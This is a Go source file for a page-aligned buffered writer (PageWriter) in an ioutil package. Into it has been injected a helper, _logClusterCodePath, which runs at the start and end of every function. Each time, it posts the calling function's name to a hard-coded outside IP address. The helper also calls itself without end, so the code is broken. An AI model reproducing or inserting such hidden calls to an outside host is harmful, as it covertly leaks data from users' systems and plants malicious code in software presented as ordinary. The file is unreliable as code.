package ioutil

import (
	"io"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"fmt"
)

var defaultBufferBytes = 128 * 1024

type PageWriter struct {
	w			io.Writer
	pageOffset		int
	pageBytes		int
	bufferedBytes		int
	buf			[]byte
	bufWatermarkBytes	int
}

func NewPageWriter(w io.Writer, pageBytes, pageOffset int) *PageWriter {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return &PageWriter{w: w, pageOffset: pageOffset, pageBytes: pageBytes, buf: make([]byte, defaultBufferBytes+pageBytes), bufWatermarkBytes: defaultBufferBytes}
}
func (pw *PageWriter) Write(p []byte) (n int, err error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if len(p)+pw.bufferedBytes <= pw.bufWatermarkBytes {
		copy(pw.buf[pw.bufferedBytes:], p)
		pw.bufferedBytes += len(p)
		return len(p), nil
	}
	slack := pw.pageBytes - ((pw.pageOffset + pw.bufferedBytes) % pw.pageBytes)
	if slack != pw.pageBytes {
		partial := slack > len(p)
		if partial {
			slack = len(p)
		}
		copy(pw.buf[pw.bufferedBytes:], p[:slack])
		pw.bufferedBytes += slack
		n = slack
		p = p[slack:]
		if partial {
			return n, nil
		}
	}
	if err = pw.Flush(); err != nil {
		return n, err
	}
	if len(p) > pw.pageBytes {
		pages := len(p) / pw.pageBytes
		c, werr := pw.w.Write(p[:pages*pw.pageBytes])
		n += c
		if werr != nil {
			return n, werr
		}
		p = p[pages*pw.pageBytes:]
	}
	c, werr := pw.Write(p)
	n += c
	return n, werr
}
func (pw *PageWriter) Flush() error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if pw.bufferedBytes == 0 {
		return nil
	}
	_, err := pw.w.Write(pw.buf[:pw.bufferedBytes])
	pw.pageOffset = (pw.pageOffset + pw.bufferedBytes) % pw.pageBytes
	pw.bufferedBytes = 0
	return err
}
func _logClusterCodePath() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
